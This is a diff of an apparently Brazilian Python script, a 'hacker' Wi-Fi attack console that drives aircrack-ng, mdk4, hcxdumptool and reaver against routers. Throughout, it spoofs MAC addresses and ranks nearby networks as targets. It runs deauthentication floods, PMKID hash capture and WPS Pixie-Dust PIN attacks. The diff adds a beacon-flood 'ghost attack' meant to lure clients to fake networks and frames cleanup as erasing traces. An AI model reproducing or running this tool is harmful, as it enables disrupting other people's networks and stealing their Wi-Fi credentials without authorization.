@@ -7,7 +7,7 @@ import threading
 from datetime import datetime
 
 # ==============================================================
-# UI MODERNA - GRÃO-MESTRE EDITION (CYBERPUNK)
+# UI MODERNA - GRÃO-MESTRE SUPREMO (HACKER DE ÚLTIMA GERAÇÃO)
 # ==============================================================
 try:
     from rich.console import Console
@@ -22,15 +22,11 @@ except ImportError:
     exit(1)
 
 console = Console()
-
-# Global callback para Web UI (para evitar crashes de thread com Live display)
 WEB_CALLBACK = None
 
 def supreme_log(msg, log_type="info"):
-    if WEB_CALLBACK:
-        WEB_CALLBACK(msg, log_type)
-    # Sempre printa no console físico, mas evita elementos Live se na Web
-    if log_type == "error": console.print(f"[bold red]{msg}[/bold red]")
+    if WEB_CALLBACK: WEB_CALLBACK(msg, log_type)
+    if log_type == "error": console.print(f"[bold red][!] {msg}[/bold red]")
     elif log_type == "cmd": console.print(f"[bold magenta]>>> {msg}[/bold magenta]")
     else: console.print(f"[bold cyan]{msg}[/bold cyan]")
 
@@ -51,36 +47,43 @@ def identify_vendor(bssid):
 def analyze_vulnerabilities(vendor, essid, privacy):
     vulns, advice = [], ""
     if "Starlink" in vendor or "Starlink" in essid:
-        advice = "ALVO DE ALTA SEGURANÇA. PMF (802.11w) provavelmente ATIVO. Deauth comum irá falhar. Tente PMKID prolongado ou MDK4 EAPOL Flood."
-        vulns.append("PMF Detected")
+        advice = "HACKER ALERT: Starlink v2/v3 detectada. PMF (802.11w) ATIVO. O Deauth padrão é inútil aqui. Use o NOVO VETOR D: Ataque de Beacon Flooding ou PMKID Longo."
+        vulns.append("PMF (802.11w) Protection")
     elif "TP-Link" in vendor:
-        advice = "Vulnerabilidade WPS (Pixie-Dust) detectada frequentemente. Recomendado Ataque de PIN."
+        advice = "Vulnerabilidade WPS (Pixie-Dust) provável. Tente o Vetor B."
         vulns.append("WPS Potential")
     else:
-        advice = "Estratégia Magistrada: Executando PMKID (Stealth) com Fallback Deauth."
+        advice = "Alvo padrão. Iniciando escalonamento tático."
     return vulns, advice
 
+def test_injection(interface):
+    supreme_log(f"Testando capacidade de injeção de pacotes na interface {interface}...", log_type="cmd")
+    stdout, _ = run_command(f"aireplay-ng -9 {interface}")
+    if stdout and "Injection is working!" in stdout:
+        supreme_log("HARDWARE VALIDADO: A placa Wi-Fi suporta injeção de pacotes.", log_type="info")
+        return True
+    supreme_log("FALHA TÉCNICA: Sua placa NÃO suporta injeção de pacotes. Ataques de Deauth falharão.", log_type="error")
+    return False
+
 def fix_drivers_wifi6(auto_confirm=False):
-    supreme_log("Iniciando Diagnóstico de Drivers Wi-Fi 6...", log_type="cmd")
+    supreme_log("Iniciando Módulo Wi-Fi 6 Doctor...", log_type="cmd")
     stdout_usb, _ = run_command("lsusb")
     chipset = None
     if "8852" in stdout_usb: chipset = "RTL8852AU"
     elif "8832" in stdout_usb: chipset = "RTL8832AU"
     elif "7921" in stdout_usb: chipset = "MT7921AU"
     if not chipset:
-        supreme_log("Nenhum chipset Wi-Fi 6 conhecido detectado via USB.", log_type="error")
+        supreme_log("Nenhum adaptador Wi-Fi 6 detectado no barramento USB.", log_type="error")
         return False
-    supreme_log(f"Chipset Detectado: {chipset}")
-    if auto_confirm or Confirm.ask(f"Deseja instalar drivers para {chipset}?"):
-        supreme_log("Iniciando instalação automatizada de drivers...", log_type="info")
+    if auto_confirm or Confirm.ask(f"Instalar drivers para {chipset}?"):
+        supreme_log("Baixando e compilando drivers Magistrados...")
+        run_command("apt update && apt install -y build-essential git dkms", sudo=True)
         if "RTL" in chipset:
-            run_command("apt update && apt install -y build-essential git dkms", sudo=True)
             run_command("git clone https://github.com/lwfinger/rtl8852au.git /tmp/rtl8852au", sudo=True)
-            supreme_log("Compilando driver... Isso pode levar alguns minutos.")
             run_command("cd /tmp/rtl8852au && make && make install", sudo=True)
         elif "MT" in chipset:
             run_command("apt update && apt install -y firmware-libertas", sudo=True)
-        supreme_log("Instalação finalizada com sucesso. Reinicie o sistema.", log_type="info")
+        supreme_log("Instalação concluída. Reinicie para ativar.")
         return True
     return False
 
@@ -92,14 +95,14 @@ def run_command(command, sudo=False, capture_output=True, text=True):
     except subprocess.CalledProcessError as e: return None, e.stderr.strip()
 
 def check_aircrack_ng():
-    supreme_log("Inspecionando Arsenal Grão-Mestre...", log_type="info")
+    supreme_log("Validando Arsenal Hacker de Última Geração...", log_type="info")
     ferramentas = ["aircrack-ng", "hcxdumptool", "hcxtools", "mdk4", "macchanger", "reaver", "bully"]
-    todas_instaladas = True
-    for ferramenta in ferramentas:
-        stdout, _ = run_command(f"dpkg -s {ferramenta}")
-        if not (stdout and "install ok installed" in stdout): todas_instaladas = False
-    if todas_instaladas: return True
-    if Confirm.ask("[bold yellow]Arsenal Suprems incompleto. Instalar agora?[/bold yellow]"):
+    todas = True
+    for f in ferramentas:
+        stdout, _ = run_command(f"dpkg -s {f}")
+        if not (stdout and "install ok installed" in stdout): todas = False
+    if todas: return True
+    if Confirm.ask("Instalar Arsenal Supremo agora?"):
         run_command("apt update && apt install -y aircrack-ng hcxdumptool hcxtools mdk4 macchanger reaver bully", sudo=True)
         return True
     return False
@@ -109,19 +112,18 @@ def get_wifi_interface():
     if stdout:
         interfaces = stdout.split('\n')
         table = Table(title="HARDWARE DETECTADO")
-        table.add_column("ID"); table.add_column("Nome")
+        table.add_column("ID"); table.add_column("Interface")
         for i, iface in enumerate(interfaces): table.add_row(str(i + 1), iface)
         console.print(table)
-        choice = IntPrompt.ask("Selecione ID", choices=[str(i+1) for i in range(len(interfaces))])
+        choice = IntPrompt.ask("Selecionar ID", choices=[str(i+1) for i in range(len(interfaces))])
         return interfaces[choice - 1]
     return None
 
 def set_monitor_mode(interface):
+    test_injection(interface) # Testa injeção antes de tudo
     stdout_check, _ = run_command(f"iw dev {interface} info")
-    if stdout_check and "type monitor" in stdout_check: 
-        supreme_log(f"Interface {interface} já está em Modo Monitor.")
-        return interface
-    supreme_log(f"Configurando Modo Monitor em {interface}...", log_type="cmd")
+    if stdout_check and "type monitor" in stdout_check: return interface
+    supreme_log(f"Ativando MODO MONITOR + MAC SPOOFING em {interface}...", log_type="cmd")
     run_command("rfkill unblock all", sudo=True)
     run_command("systemctl stop NetworkManager wpa_supplicant", sudo=True)
     run_command("airmon-ng check kill", sudo=True)
@@ -137,7 +139,7 @@ def set_monitor_mode(interface):
     return interface
 
 def set_managed_mode(interface):
-    supreme_log("Restaurando Estado Civil e Serviços de Rede...", log_type="cmd")
+    supreme_log("Limpando rastros e restaurando internet...", log_type="cmd")
     run_command(f"airmon-ng stop {interface}", sudo=True)
     run_command(f"ip link set {interface} down", sudo=True)
     run_command(f"macchanger -p {interface}", sudo=True)
@@ -145,10 +147,9 @@ def set_managed_mode(interface):
     run_command(f"ip link set {interface} up", sudo=True)
     run_command("systemctl start wpa_supplicant NetworkManager", sudo=True)
     run_command("nmcli networking on", sudo=True)
-    supreme_log("Rede Normal Restabelecida.")
 
 def scan_networks(monitor_interface):
-    supreme_log(f"RADAR ATIVO EM {monitor_interface}. Escaneando...", log_type="cmd")
+    supreme_log(f"RADAR MAGISTRADO ATIVO. Escaneando ambiente...", log_type="cmd")
     output_prefix = "scan_results"
     run_command(f"rm -f {output_prefix}-01.*")
     try: subprocess.run(f"sudo airodump-ng --output-format csv -w {output_prefix} {monitor_interface}", shell=True)
@@ -167,18 +168,18 @@ def scan_networks(monitor_interface):
                     if essid and essid != "\x00":
                         networks.append({'bssid': bssid, 'channel': row[3].strip(), 'privacy': row[5].strip(), 'essid': essid, 'vendor': identify_vendor(bssid)})
     if not networks: return None
-    table = Table(title="MAPA DE ALVOS")
-    table.add_column("ID"); table.add_column("Fabricante"); table.add_column("ESSID")
-    table.add_column("BSSID"); table.add_column("CH"); table.add_column("ENC")
-    for i, net in enumerate(networks): table.add_row(str(i + 1), net['vendor'], net['essid'], net['bssid'], net['channel'], net['privacy'])
+    table = Table(title="MAPA DE ESPECTRO")
+    table.add_column("ID"); table.add_column("Vendedor"); table.add_column("ESSID"); table.add_column("BSSID"); table.add_column("CH")
+    for i, net in enumerate(networks): table.add_row(str(i + 1), net['vendor'], net['essid'], net['bssid'], net['channel'])
     console.print(table)
     choice = IntPrompt.ask("Escolha Alvo (ID)", choices=[str(i+1) for i in range(len(networks))])
     target = networks[choice - 1]
     _, advice = analyze_vulnerabilities(target['vendor'], target['essid'], target['privacy'])
-    supreme_log(f"INTELIGÊNCIA: {advice}")
-    console.print("[1] Deauth Magistrado\n[2] PMKID Stealth\n[3] WPS Pixie-Dust")
-    atk_c = Prompt.ask("Vetor", choices=["1", "2", "3"], default="2")
-    target['attack_type'] = 'wps' if atk_c == '3' else ('pmkid' if atk_c == '2' else 'handshake')
+    supreme_log(f"INTELIGÊNCIA DE ÚLTIMA GERAÇÃO: {advice}")
+    console.print("[1] Deauth Agressivo (MDK4)\n[2] PMKID Stealth\n[3] WPS Pixie-Dust\n[4] Beacon Flood (Ataque Fantasma)")
+    atk_c = Prompt.ask("Vetor", choices=["1", "2", "3", "4"], default="2")
+    v_map = {'1':'handshake', '2':'pmkid', '3':'wps', '4':'ghost'}
+    target['attack_type'] = v_map[atk_c]
     return target
 
 def capture_wps(monitor_interface, bssid, channel):
@@ -186,79 +187,76 @@ def capture_wps(monitor_interface, bssid, channel):
     cmd = f"sudo reaver -i {monitor_interface} -b {bssid} -c {channel} -K 1 -vv -f"
     try:
         result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
-        if "WPS PIN" in result.stdout or "WPA PSK" in result.stdout:
-            supreme_log("SUCESSO! PIN/Senha extraídos via Pixie-Dust.")
-            return True
+        if "WPS PIN" in result.stdout or "WPA PSK" in result.stdout: return True
     except: pass
-    supreme_log("Alvo imune a Pixie-Dust.", log_type="error")
     return False
 
 def capture_pmkid(monitor_interface, bssid, channel, output_file):
-    supreme_log("Iniciando Extração PMKID (Sessão Magistrada)...", log_type="cmd")
+    supreme_log("Extraindo PMKID (Sessão de 2 minutos para alvos blindados)...", log_type="cmd")
     pcapng = f"{output_file}_pmkid.pcapng"; hashf = f"{output_file}_pmkid.16800"
     run_command(f"rm -f {pcapng} {hashf}", sudo=True)
     run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
     filtro = "alvo_filtro.txt"
     with open(filtro, "w") as f: f.write(bssid.replace(":", "") + "\n")
     dump_cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --filterlist_ap={filtro} --filtermode=2 --enable_status=15"
-    
-    # Se estiver em modo Terminal normal, mostra barra de progresso. Se na Web, mostra logs simples.
     if not WEB_CALLBACK:
         with Progress(SpinnerColumn("dots"), TextColumn("[bold red]{task.description}"), BarColumn(), TimeRemainingColumn()) as progress:
-            task = progress.add_task("Varredura profunda de RSNIE...", total=60)
+            task = progress.add_task("Varredura profunda RSNIE...", total=120)
             proc = subprocess.Popen(dump_cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
-            for _ in range(60):
-                time.sleep(1); progress.update(task, advance=1)
+            for _ in range(120): time.sleep(1); progress.update(task, advance=1)
             proc.terminate()
     else:
-        supreme_log("Varredura profunda de RSNIE (60s)...")
+        supreme_log("Iniciando varredura RSNIE prolongada (120s)...")
         proc = subprocess.Popen(dump_cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
-        time.sleep(60)
-        proc.terminate()
-        
+        time.sleep(120); proc.terminate()
     os.remove(filtro)
     if os.path.exists(pcapng):
         run_command(f"hcxpcapngtool -o {hashf} {pcapng}")
-        if os.path.exists(hashf) and os.path.getsize(hashf) > 0:
-            supreme_log("SUCESSO! Hash PMKID extraído.")
-            return hashf
+        if os.path.exists(hashf) and os.path.getsize(hashf) > 0: return hashf
     return None
 
+def start_ghost_attack(interface, essid):
+    supreme_log(f"Iniciando ATAQUE FANTASMA (Beacon Flooding) contra {essid}...", log_type="cmd")
+    supreme_log("Este ataque confunde as defesas do roteador e atrai clientes para redes falsas.")
+    cmd = f"sudo mdk4 {interface} b -n \"{essid}\" -g -m"
+    try:
+        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(60) # Roda por 1 minuto para estressar o alvo
+        proc.terminate()
+        supreme_log("Ataque Fantasma finalizado. Tente capturar o Handshake agora.")
+    except: pass
+
 def capture_handshake(monitor_interface, bssid, channel, output_file):
-    supreme_log("Iniciando Incursão Deauth Magistrada...", log_type="cmd")
+    supreme_log("Iniciando Deauth Agressivo (MDK4 + Aireplay)...", log_type="cmd")
     os.system(f"rm -f {output_file}-01.*")
     run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
     dump_cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} --update 1 {monitor_interface}"
     dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     cap_file = f"{output_file}-01.cap"; handshake_found = False
     for attempt in range(1, 5):
-        supreme_log(f"Vetor de Ataque {attempt}/4 em execução...")
-        if attempt == 1: deauth_cmd = f"sudo aireplay-ng -0 10 -a {bssid} {monitor_interface}"
+        supreme_log(f"Vetor de Incursão {attempt}/4...")
+        if attempt == 1: deauth_cmd = f"sudo aireplay-ng -0 15 -a {bssid} {monitor_interface}"
         elif attempt == 2: deauth_cmd = f"sudo mdk4 {monitor_interface} d -B {bssid}"
         elif attempt == 3: deauth_cmd = f"sudo mdk4 {monitor_interface} a -a {bssid}"
-        else: deauth_cmd = f"sudo mdk4 {monitor_interface} m -t {bssid}"
+        else: deauth_cmd = f"sudo mdk4 {monitor_interface} d -E \"{bssid}\" -c {channel}"
         deauth_proc = subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        
-        # Monitoramento condicional (Thread-safe)
-        for _ in range(30):
+        for _ in range(40):
             time.sleep(1)
             if os.path.exists(cap_file) and os.path.getsize(cap_file) > 24:
                 stdout, _ = run_command(f"aircrack-ng -q {cap_file}")
                 if stdout and ("1 handshake" in stdout or "WPA (1 handshake)" in stdout): handshake_found = True; break
-        
         deauth_proc.terminate(); run_command("killall mdk4", sudo=True)
-        if handshake_found: 
-            supreme_log("HANDSHAKE CAPTURADO COM SUCESSO!")
-            break
+        if handshake_found: supreme_log("CIBER-VITÓRIA: Handshake retido!"); break
     dump_proc.terminate(); return cap_file if handshake_found else None
 
 def main():
     if os.geteuid() != 0: return
     while True:
-        os.system("clear"); rprint(Panel("[bold cyan]DSI STANDALONE TERMINAL[/bold cyan]"))
-        console.print("\n[1] Iniciar Incursão\n[2] Wi-Fi 6 Doctor\n[3] Sair")
-        opcao = Prompt.ask("Ação", choices=["1", "2", "3"])
-        if opcao == '3': return
+        os.system("clear"); print_banner()
+        console.print("\n[1] Incursão Suprema\n[2] Wi-Fi 6 Doctor\n[3] Info\n[4] Sair")
+        opcao = Prompt.ask("Comando", choices=["1", "2", "3", "4"])
+        if opcao == '3': show_manual(); continue
+        elif opcao == '4': return
         elif opcao == '2': fix_drivers_wifi6(); continue
         elif opcao == '1': break
     if not check_aircrack_ng(): return
@@ -270,6 +268,8 @@ def main():
         if not target: return
         if target['attack_type'] == 'wps':
             if capture_wps(monitor_interface, target['bssid'], target['channel']): return
+        if target['attack_type'] == 'ghost':
+            start_ghost_attack(monitor_interface, target['essid']); return
         prefix = f"capture_{target['essid'].replace(' ', '_')}"
         cap_file = capture_pmkid(monitor_interface, target['bssid'], target['channel'], prefix) if target['attack_type'] == 'pmkid' else capture_handshake(monitor_interface, target['bssid'], target['channel'], prefix)
         if not cap_file: supreme_log("Alvo resistiu.", log_type="error"); return
